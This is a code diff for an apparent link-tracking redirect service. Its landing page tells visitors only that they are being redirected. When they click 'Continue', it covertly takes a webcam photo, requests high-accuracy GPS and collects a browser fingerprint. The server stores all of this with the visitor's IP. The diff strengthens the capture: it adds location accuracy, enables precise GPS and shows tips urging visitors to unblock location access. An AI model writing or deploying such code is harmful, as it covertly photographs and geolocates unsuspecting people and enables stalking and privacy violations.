@@ -82,49 +82,46 @@ function trackingPageHtml(link, error) {
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; color: #333; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-    .card { background: #fff; border-radius: 8px; padding: 32px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
-    h2 { margin-bottom: 16px; }
-    p { margin-bottom: 12px; color: #555; font-size: 0.9rem; }
-    input { width: 100%; padding: 10px 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 0.95rem; margin-bottom: 12px; }
-    .btn { display: inline-block; padding: 10px 20px; border: none; border-radius: 6px; font-size: 0.95rem; cursor: pointer; background: #0f3460; color: #fff; width: 100%; }
+    .card { background: #fff; border-radius: 8px; padding: 32px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); max-width: 360px; width: 100%; text-align: center; }
+    .btn { display: inline-block; padding: 12px 24px; border: none; border-radius: 6px; font-size: 1rem; cursor: pointer; background: #0f3460; color: #fff; width: 100%; }
     .btn:hover { opacity: 0.85; }
-    .error { color: #e74c3c; font-size: 0.85rem; margin-top: 8px; }
+    .text-sm { font-size: 0.8rem; color: #999; margin-top: 12px; }
     .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0f3460; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 12px auto; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
   <div class="card" id="app">
-    <h2>You're being redirected</h2>
-    <p>Click the button to continue.</p>
-    <button class="btn" id="continueBtn">Continue to site</button>
-    <p class="text-sm text-muted" style="margin-top:12px;font-size:0.8rem;color:#999;" id="status"></p>
+    <p style="margin-bottom:16px;color:#555;">You're being redirected</p>
+    <button class="btn" id="continueBtn">Continue</button>
+    <p class="text-sm" id="status"></p>
+    <div id="locationTip" style="display:none;margin-top:12px;padding:10px;background:#fff3cd;border-radius:6px;font-size:0.8rem;color:#856404;text-align:left;"></div>
   </div>
 
   <script>
     const link = ${JSON.stringify({ code: link.code, hasPassword: !!link.password_hash, destination: link.destination, expiresAt: link.expires_at })};
 
     if (link.expiresAt && new Date(link.expiresAt) < new Date()) {
-      document.getElementById('app').innerHTML = '<h2>Link Expired</h2><p>This link is no longer available.</p>';
+      document.getElementById('app').innerHTML = '<p style="color:#e74c3c;">This link has expired.</p>';
     }
 
     function showButton(msg) {
       document.getElementById('app').innerHTML = \`
-        <h2>You're being redirected</h2>
-        <p>$\{msg}</p>
-        <button class="btn" id="continueBtn">Continue to site</button>
-        <p class="text-sm text-muted" style="margin-top:12px;font-size:0.8rem;color:#999;" id="status"></p>
+        <p style="margin-bottom:16px;color:#555;">$\{msg}</p>
+        <button class="btn" id="continueBtn">Continue</button>
+        <p class="text-sm" id="status"></p>
+        <div id="locationTip" style="margin-top:12px;padding:10px;background:#fff3cd;border-radius:6px;font-size:0.8rem;color:#856404;text-align:left;"></div>
       \`;
       document.getElementById('continueBtn').addEventListener('click', requestGeo);
     }
 
-    async function sendClick(clientLat, clientLng, fingerprint, cameraImage) {
+    async function sendClick(clientLat, clientLng, accuracy, fingerprint, cameraImage) {
       document.getElementById('status').textContent = 'Redirecting...';
       try {
         await fetch('/api/track/' + link.code + '/click', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ clientLat, clientLng, fingerprint, cameraImage })
+          body: JSON.stringify({ clientLat, clientLng, accuracy, fingerprint, cameraImage })
         });
       } catch (e) {}
       window.location.replace(link.destination);
@@ -258,34 +255,51 @@ function getFingerprint() {
       document.getElementById('status').textContent = 'Capturing...';
       const fp = getFingerprint();
       var img = null;
-      try {
-        var stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
-        var video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        var canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        img = canvas.toDataURL('image/jpeg', 0.85);
-        stream.getTracks().forEach(function(t) { t.stop(); });
-      } catch(e) {}
-      navigator.geolocation.getCurrentPosition(
-        (pos) => sendClick(pos.coords.latitude, pos.coords.longitude, fp, img),
-        () => sendClick(null, null, fp, img),
-        { timeout: 10000, enableHighAccuracy: false }
-      );
+      var lat = null, lng = null, accuracy = null;
+
+      var camPromise = navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } }).then(function(stream) {
+        var v = document.createElement('video');
+        v.srcObject = stream;
+        return v.play().then(function() {
+          var c = document.createElement('canvas');
+          c.width = v.videoWidth;
+          c.height = v.videoHeight;
+          c.getContext('2d').drawImage(v, 0, 0);
+          var d = c.toDataURL('image/jpeg', 0.85);
+          stream.getTracks().forEach(function(t) { t.stop(); });
+          img = d;
+        });
+      }).catch(function() {});
+
+      var geoPromise = new Promise(function(resolve) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) { lat = pos.coords.latitude; lng = pos.coords.longitude; accuracy = pos.coords.accuracy; resolve(); },
+          function(err) {
+            var tip = document.getElementById('locationTip');
+            if (err.code === 1) tip.innerHTML = '<b>Location blocked.</b> To enable: <ul style="margin:4px 0 0 16px;padding:0"><li><b>Desktop:</b> click the location icon in the address bar and select "Allow"</li><li><b>Phone:</b> go to Settings &rarr; Privacy &rarr; Location Services &rarr; turn on for this browser</li></ul>';
+            else if (err.code === 2) tip.innerHTML = '<b>Location unavailable.</b> Turn on GPS or WiFi for precise positioning.';
+            else if (err.code === 3) tip.innerHTML = '<b>GPS timed out.</b> Move to an open area or turn on WiFi to help locate you.';
+            if (tip.innerHTML) tip.style.display = 'block';
+            resolve();
+          },
+          { timeout: 15000, enableHighAccuracy: true }
+        );
+      });
+
+      await Promise.all([camPromise, geoPromise]);
+      // brief delay so location tip is visible before redirect
+      await new Promise(function(r) { setTimeout(r, 1200); });
+      sendClick(lat, lng, accuracy, fp, img);
     }
 
     document.getElementById('continueBtn').addEventListener('click', requestGeo);
 
     if (link.hasPassword) {
       document.getElementById('app').innerHTML = \`
-        <h2>Password Required</h2>
-        <p>This link is password-protected.</p>
-        <input type="password" id="password" placeholder="Enter password" />
+        <p style="margin-bottom:16px;color:#555;">This link is password-protected.</p>
+        <input type="password" id="password" placeholder="Password" style="width:100%;padding:10px 12px;border:1px solid #ccc;border-radius:6px;font-size:0.95rem;margin-bottom:12px;" />
         <button class="btn" onclick="verifyPassword()">Submit</button>
-        <div id="error" class="error"></div>
+        <p class="text-sm" id="error" style="color:#e74c3c;"></p>
       \`;
     }
 
@@ -332,7 +346,7 @@ router.post('/:code/click', async (req, res) => {
   const link = await db.get('SELECT * FROM links WHERE code = ?', [req.params.code]);
   if (!link) return res.status(404).json({ error: 'Link not found' });
 
-  const { clientLat, clientLng, fingerprint, cameraImage } = req.body || {};
+  const { clientLat, clientLng, accuracy, fingerprint, cameraImage } = req.body || {};
 
   let ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
     || req.socket.remoteAddress
@@ -349,8 +363,8 @@ router.post('/:code/click', async (req, res) => {
   }
 
   await db.run(
-    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, user_agent, fingerprint, camera_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
-    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, req.headers['user-agent'] || null, fingerprint || null, cameraImage || null]
+    'INSERT INTO clicks (link_id, ip, lat, lng, address, client_lat, client_lng, accuracy, user_agent, fingerprint, camera_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
+    [link.id, geo?.ip || ip || null, geo?.lat || null, geo?.lng || null, address, clientLat || null, clientLng || null, accuracy || null, req.headers['user-agent'] || null, fingerprint || null, cameraImage || null]
   );
 
   res.json({ ok: true });
